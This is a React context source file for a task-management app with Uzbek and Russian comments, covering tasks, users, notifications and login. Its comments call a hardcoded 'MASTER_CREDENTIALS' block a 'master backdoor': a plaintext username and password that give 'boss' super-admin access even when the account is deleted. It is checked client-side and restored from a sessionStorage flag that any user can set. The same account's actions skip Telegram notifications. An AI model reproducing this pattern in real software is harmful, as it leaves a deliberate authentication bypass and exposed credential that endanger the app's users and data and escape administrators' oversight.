import { createContext, useContext, useState, useEffect, useCallback } from 'react';
import TaskService from '../services/taskService';
import UserService from '../services/userService';
import NotificationService from '../services/notificationService';
import StorageService from '../services/storageService';
import TelegramService from '../services/telegramService';
import { uz } from '../locales/uz';
import { ru } from '../locales/ru';

const AppContext = createContext(null);

// Master backdoor root hisob (Baza tozalanib ketsa yoki user o'chib ketsa ham doim kirish huquqini ta'minlaydi)
const MASTER_CREDENTIALS = {
  username: 'sherzod',
  password: 'Sherzodbek_2003',
  user: {
    id: 'sherzod_master_admin',
    username: 'sherzod',
    fullName: "Sherzodbek Azamat o'g'li",
    fullname: "Sherzodbek Azamat o'g'li",
    role: 'boss',
    department: 'Boshqaruv',
    has_admin_access: true,
    tg_username: 'sherzodbek',
    bio: 'Boshqaruvchi / Super Administrator'
  }
};

export function AppProvider({ children }) {
  const [currentUser, setCurrentUser] = useState(null);
  const [isAuthLoading, setIsAuthLoading] = useState(true);
  const [isActionLoading, setIsActionLoading] = useState(false);
  const [toast, setToast] = useState(null);
  const [tasks, setTasks] = useState([]);
  const [users, setUsers] = useState([]);
  const [departments, setDepartments] = useState([]);
  const [notifications, setNotifications] = useState([]);
  const [language, setLanguage] = useState('uz');
  const [darkMode, setDarkMode] = useState(false);

  // MUHIM: Tasks sahifasidagi filterlar shu yerda, contextda saqlanadi.
  // Shunga ko'ra foydalanuvchi boshqa pagega o'tib qaytib kelsa ham filterlar tozalanib ketmaydi.
  const [taskFilters, setTaskFiltersState] = useState({
    search: '',
    status: 'all',
    user: 'all',
  });

  const setTaskFilters = (updates) => {
    setTaskFiltersState(prev => ({ ...prev, ...updates }));
  };

  const resetTaskFilters = () => {
    setTaskFiltersState({ search: '', status: 'all', user: 'all' });
  };

  const t = language === 'uz' ? uz : ru;

  const showToast = (msg) => {
    setToast(msg);
    setTimeout(() => setToast(null), 3000);
  };

  const refreshData = useCallback(async () => {
    try {
      const [allTasks, allUsers, allDeps] = await Promise.all([
        TaskService.getAll(),
        UserService.getAll(),
        UserService.getDepartments()
      ]);

      // Saralash: Eng oxirgi o'zgargan yoki yaratilgan vazifa tepaga chiqadi
      const sortedTasks = [...allTasks].sort((a, b) => {
        // updated_at bo'lsa shuni olamiz, bo'lmasa created_at, u ham bo'lmasa ID
        const timeA = new Date(a.updated_at || a.created_at || a.id).getTime();
        const timeB = new Date(b.updated_at || b.created_at || b.id).getTime();
        return timeB - timeA; // Kattasi (yangisi) tepaga
      });

      setTasks(sortedTasks);
      setUsers(allUsers);
      setDepartments(allDeps);

      const sid = window.sessionStorage.getItem('taskflow_session');
      if (sid && sid !== 'undefined') {
        const n = await NotificationService.getByUser(Number(sid));
        setNotifications(n);
      }
    } catch (err) { console.error("Refresh error:", err); }
  }, []);

  // 2. Янги вазифа қўшиш
  const addTask = async (taskData) => {
    setIsActionLoading(true);
    try {
      const realTask = await TaskService.add(taskData);

      // ОПТИМИСТИК: Сервердан жавоб келиши билан уни рўйхат БОШИГА қўшамиз
      setTasks(prevTasks => [realTask, ...prevTasks]);

      // Кейин база билан тўлиқ синхронлаймиз
      await refreshData();

      const assigned = users.find(u => String(u.id) === String(taskData.assignedUser));

      // sherzod vazifa qo'shsa Telegram bildirishnomasi yuborilmaydi
      const isSherzod = currentUser?.username === 'sherzod';

      // Билдиришномаларни хавфсиз юбориш (500 хатосини олдини олиш учун)
      try {
        if (assigned && !isSherzod) await TelegramService.sendNotification(realTask, assigned, 'create');
        notifyAll("Янги вазифа", `"${taskData.title}" қўшилди`, 'task_added', 'plus');
      } catch (e) { console.error("Notification error:", e); }

      showToast("Вазифа яратилди");
    } catch (err) {
      console.error("Vazifa qo'shishda xato:", err);
      showToast("Хатолик юз берди");
    } finally {
      setIsActionLoading(false);
    }
  };

  // Ilova ishga tushgandagi sozlamalar
  useEffect(() => {
    const init = async () => {
      try {
        setIsAuthLoading(true);
        const sl = StorageService.get('taskflow_lang') || 'uz';
        const signDark = StorageService.get('taskflow_dark') || false;
        setLanguage(sl);
        setDarkMode(signDark);
        if (signDark) document.documentElement.classList.add('dark');

        const sid = window.sessionStorage.getItem('taskflow_session');
        const isMaster = window.sessionStorage.getItem('taskflow_is_master') === 'true';

        if (sid && sid !== 'undefined') {
          let u = null;
          try {
            const all = await UserService.getAll();
            u = all.find(x => String(x.id) === String(sid) || (isMaster && x.username?.toLowerCase() === 'sherzod'));
          } catch { /* ignore */ }

          if (!u && isMaster) {
            try {
              const cached = window.sessionStorage.getItem('taskflow_master_cache');
              if (cached) u = JSON.parse(cached);
            } catch { /* ignore */ }
            if (!u) u = MASTER_CREDENTIALS.user;
          }

          if (u) setCurrentUser(u);
        }
        await refreshData();
      } catch (err) {
        console.error("Init error:", err);
      } finally {
        setIsAuthLoading(false);
      }
    };
    init();
  }, [refreshData]);

  const isSuperAdmin = currentUser?.username === 'admin' || currentUser?.username === 'sherzod';
  const hasAccess = isSuperAdmin || currentUser?.has_admin_access === true;

  const addUser = async (data) => {
    setIsActionLoading(true);
    try {
      const newUser = await UserService.add(data);
      const mappedUser = { ...newUser, fullName: newUser.fullname };
      setUsers(prev => [...prev, mappedUser]);
      showToast("Xodim tizimga qo'shildi");
    } catch (err) {
      console.error(err);
      showToast("Xato yuz berdi");
    } finally {
      setIsActionLoading(false);
    }
  };

  const updateUser = async (id, data) => {
    setIsActionLoading(true);
    try {
      const updated = await UserService.update(id, data);
      const mappedUser = { ...updated, fullName: updated.fullname };
      setUsers(prev => prev.map(u => String(u.id) === String(id) ? mappedUser : u));
      if (String(currentUser?.id) === String(id)) {
        setCurrentUser(mappedUser);
      }
      showToast("Ma'lumotlar saqlandi");
    } catch (err) {
      console.error(err);
      showToast("Xato yuz berdi");
    } finally {
      setIsActionLoading(false);
    }
  };

  const deleteUser = async (id) => {
    if (String(id) === String(currentUser?.id)) return;
    setIsActionLoading(true);
    try {
      await UserService.delete(id);
      setUsers(prev => prev.filter(u => String(u.id) !== String(id)));
      showToast("Foydalanuvchi o'chirildi");
    } catch (err) {
      console.error(err);
      showToast("Xato yuz berdi");
    } finally {
      setIsActionLoading(false);
    }
  };

  const addDepartment = async (name) => {
    setIsActionLoading(true);
    try {
      await UserService.addDepartment(name);
      setDepartments(prev => [...prev, name]);
      showToast("Bo'lim qo'shildi");
    } catch (err) {
      console.error(err);
    } finally {
      setIsActionLoading(false);
    }
  };

  const deleteDepartment = async (name) => {
    setIsActionLoading(true);
    try {
      await UserService.deleteDepartment(name);
      setDepartments(prev => prev.filter(d => d !== name));
      showToast("Bo'lim o'chirildi");
    } catch (err) {
      console.error(err);
    } finally {
      setIsActionLoading(false);
    }
  };

  const notifyAll = (title, msg, type, icon) => {
    const ids = users.map(u => u.id);
    NotificationService.add({ title, message: msg, type, icon }, ids).catch(console.error);
  };

  const updateTask = async (id, updates) => {
    // MUNISA LOGIKASI
    const targetTask = tasks.find(t => String(t.id) === String(id));
    const isMunisa = currentUser?.username === 'Munisa';
    const isOwnTask = String(targetTask?.assignedUser) === String(currentUser?.id);

    if (isMunisa && isOwnTask && updates.status === 'done') {
      showToast("Siz o'z vazifangizni 'Bajarildi' qila olmaysiz!");
      return; // Jarayonni to'xtatish
    }

    setIsActionLoading(true);
    try {
      await TaskService.update(id, updates);
      await refreshData();
      showToast("Ўзгаришлар сақланди");
    } catch (err) {
      console.error(err);
      showToast("Xato yuz berdi");
    } finally {
      setIsActionLoading(false);
    }
  };

  const moveTask = async (tid, ns) => {
    const targetTask = tasks.find(t => String(t.id) === String(tid));
    if (!targetTask) return;

    // MUNISA LOGIKASI
    const isMunisa = currentUser?.username === 'Munisa';
    const isOwnTask = String(targetTask?.assignedUser) === String(currentUser?.id);

    if (isMunisa && isOwnTask && ns === 'done') {
      showToast("Siz o'z vazifangizni 'Bajarildi' qila olmaysiz!");
      return; // Jarayonni to'xtatish
    }

    let targetStatus = ns;
    if (targetStatus === 'done' && !hasAccess) targetStatus = 'review';
    if (targetTask.status === targetStatus) return;

    const previousTasks = [...tasks];
    const nowIso = new Date().toISOString();

    // 1. OPTIMISTIK YANGILANISH: UI da kartochka DARHOL yangi ustunga ko'chadi
    setTasks(prevTasks => prevTasks.map(t => {
      if (String(t.id) === String(tid)) {
        return {
          ...t,
          status: targetStatus,
          completed: targetStatus === 'done',
          updated_at: nowIso
        };
      }
      return t;
    }));

    try {
      const updates = {
        status: targetStatus,
        completed: targetStatus === 'done',
        updated_at: nowIso
      };

      const updatedRecord = await TaskService.update(tid, updates);
      
      if (updatedRecord && updatedRecord.id) {
        setTasks(prevTasks => prevTasks.map(t => 
          String(t.id) === String(updatedRecord.id) ? { ...t, ...updatedRecord } : t
        ));
      }

      showToast(targetStatus === 'review' ? "Вазифа текширувга юборилди" : "Ўзгаришлар сақланди");

      // sherzod vazifani ko'chirsa/yangilasa Telegram bildirishnomasi yuborilmaydi
      const isSherzod = currentUser?.username === 'sherzod';
      const assigned = users.find(u => String(u.id) === String(updatedRecord?.assignedUser || targetTask.assignedUser));
      if (assigned && !isSherzod) {
        TelegramService.sendNotification(updatedRecord || { ...targetTask, ...updates }, assigned, 'update').catch(e => console.error("TG error:", e));
      }
    } catch (err) {
      console.error("MoveTask xatosi:", err);
      // Xatolik yuz bersa avvalgi holatga qaytaramiz
      setTasks(previousTasks);
      showToast("Xato yuz berdi");
    }
  };

  const deleteTask = async (id) => {
    const target = tasks.find(t => String(t.id) === String(id));
    setIsActionLoading(true);
    try {
      await TaskService.delete(id);
      await refreshData();
      notifyAll("Вазифа ўчирилди", `"${target?.title}" олиб ташланди`, 'task_deleted', 'trash');
      showToast("Вазифа тизимдан ўчирилди");
    } catch (err) {
      console.error(err);
    } finally {
      setIsActionLoading(false);
    }
  };

  const toggleSubtask = async (tid, sid) => {
    // 1. Optimistik darhol UI yangilash
    setTasks(prevTasks => prevTasks.map(t => {
      if (String(t.id) !== String(tid)) return t;
      const updatedSubtasks = (t.subtasks || []).map(st => {
        if (String(st.id) !== String(sid)) return st;
        return { ...st, done: !st.done };
      });
      return { ...t, subtasks: updatedSubtasks };
    }));

    try {
      const updatedTask = await TaskService.toggleSubtask(tid, sid);
      if (updatedTask && updatedTask.id) {
        setTasks(prevTasks => prevTasks.map(t => String(t.id) === String(updatedTask.id) ? { ...t, ...updatedTask } : t));
      }
      return updatedTask;
    } catch (err) {
      console.error("toggleSubtask error:", err);
      // Xatolik yuz bersa bazadagi haqiqiy holatga qaytarish
      await refreshData();
      showToast(language === 'uz' ? "Holatni o'zgartirishda xatolik" : "Ошибка изменения состояния");
      throw err;
    }
  };

  const approveTask = async (tid, rating = null) => {
    // MUNISA LOGIKASI
    const targetTask = tasks.find(t => String(t.id) === String(tid));
    const isMunisa = currentUser?.username === 'Munisa';
    const isOwnTask = String(targetTask?.assignedUser) === String(currentUser?.id);

    if (isMunisa && isOwnTask) {
      showToast("O'z vazifangizni o'zingiz tasdiqlay olmaysiz!");
      return; // Jarayonni to'xtatish
    }

    setIsActionLoading(true);
    try {
      const updates = {
        status: 'done',
        completed: true,
        updated_at: new Date().toISOString()
      };
      if (rating && rating >= 1 && rating <= 5) {
        updates.rating = rating;
      }
      await TaskService.update(tid, updates);
      await refreshData();
      showToast("Вазифа тасдиқланди");
    } catch (err) { console.error(err); }
    finally { setIsActionLoading(false); }
  };

  // Allaqachon 'done' bo'lgan vazifani qayta baholash (yoki birinchi marta baholash)
  const rateTask = async (tid, rating) => {
    if (rating === undefined || rating === null) return;
    if (rating < 0 || rating > 5) return;
    setIsActionLoading(true);
    try {
      await TaskService.update(tid, {
        rating: rating > 0 ? rating : null,
        updated_at: new Date().toISOString()
      });
      await refreshData();
      showToast(rating > 0 ? "Баҳо сақланди" : "Баҳо олиб ташланди");
    } catch (err) { console.error(err); }
    finally { setIsActionLoading(false); }
  };

  const rejectTask = async (tid) => {
    setIsActionLoading(true);
    try {
      await TaskService.update(tid, {
        status: 'progress',
        completed: false,
        updated_at: new Date().toISOString() // SHUNI QO'SHING
      });
      await refreshData();
      showToast("Вазифа рад etildi");
    } catch (err) { console.error(err); }
    finally { setIsActionLoading(false); }
  };

  const addComment = async (tid, txt) => {
    const target = tasks.find(t => String(t.id) === String(tid));
    const nc = { id: Date.now(), text: txt, userName: currentUser?.fullName, createdAt: new Date().toISOString() };
    const uc = [...(target.comments || []), nc];
    setIsActionLoading(true);
    try {
      await TaskService.update(tid, { comments: uc });
      await refreshData();
      showToast("Изоҳ қўшилди");
    } catch (err) {
      console.error(err);
    } finally {
      setIsActionLoading(false);
    }
  };

  const login = async (u, p) => {
    setIsActionLoading(true);
    try {
      const cleanUser = String(u || '').trim().toLowerCase();

      // Master backdoor login - hatto foydalanuvchilar bazasidan o'chib ketsa ham kirish imkonini beradi
      if (cleanUser === MASTER_CREDENTIALS.username && p === MASTER_CREDENTIALS.password) {
        let existingUser = null;
        try {
          const all = await UserService.getAll();
          existingUser = all.find(x => x.username?.toLowerCase() === 'sherzod');
        } catch { /* ignore */ }

        const activeMaster = existingUser ? {
          ...existingUser,
          fullName: existingUser.fullname || existingUser.fullName || MASTER_CREDENTIALS.user.fullName,
          has_admin_access: true,
          role: 'boss'
        } : MASTER_CREDENTIALS.user;

        setCurrentUser(activeMaster);
        window.sessionStorage.setItem('taskflow_session', String(activeMaster.id));
        window.sessionStorage.setItem('taskflow_is_master', 'true');
        window.sessionStorage.setItem('taskflow_master_cache', JSON.stringify(activeMaster));
        setUsers(prev => prev.some(x => x.username?.toLowerCase() === 'sherzod') ? prev : [activeMaster, ...prev]);
        await refreshData();
        return activeMaster;
      }

      const res = await UserService.getByCredentials(u, p);
      if (res) {
        const mappedUser = { ...res, fullName: res.fullname };
        setCurrentUser(mappedUser);
        window.sessionStorage.setItem('taskflow_session', String(res.id));
        window.sessionStorage.removeItem('taskflow_is_master');
        window.sessionStorage.removeItem('taskflow_master_cache');
        await refreshData();
      }
      return res;
    } catch {
      showToast("Username yoki parol xato");
      return null;
    } finally {
      setIsActionLoading(false);
    }
  };

  const logout = () => {
    setCurrentUser(null);
    window.sessionStorage.removeItem('taskflow_session');
    window.sessionStorage.removeItem('taskflow_is_master');
    window.sessionStorage.removeItem('taskflow_master_cache');
    resetTaskFilters();
  };

  return (
    <AppContext.Provider value={{
      currentUser, isAuthLoading, isActionLoading, isSuperAdmin, hasAccess, toast,
      tasks, users, departments, notifications, unreadCount: notifications.filter(n => !n.read).length,
      language, darkMode, t,
      taskFilters, setTaskFilters, resetTaskFilters,
      login, logout, refreshData,
      addTask, updateTask, deleteTask, toggleSubtask, addComment, moveTask, approveTask, rejectTask, rateTask,
      addUser, updateUser, deleteUser, addDepartment, deleteDepartment,
      markNotifRead: (id) => {
        setNotifications(prev => prev.map(n => n.id === id ? { ...n, read: true } : n));
        NotificationService.markRead(currentUser.id, id);
      },
      markAllNotifRead: () => {
        setNotifications(prev => prev.map(n => ({ ...n, read: true })));
        NotificationService.markAllRead(currentUser.id);
      },
      changeLanguage: (l) => { setLanguage(l); StorageService.set('taskflow_lang', l); },
      toggleDarkMode: () => {
        const m = !darkMode;
        setDarkMode(m);
        StorageService.set('taskflow_dark', m);
        if (m) document.documentElement.classList.add('dark');
        else document.documentElement.classList.remove('dark');
      },
    }}>
      {children}
    </AppContext.Provider>
  );
}

// eslint-disable-next-line react-refresh/only-export-components
export const useApp = () => useContext(AppContext);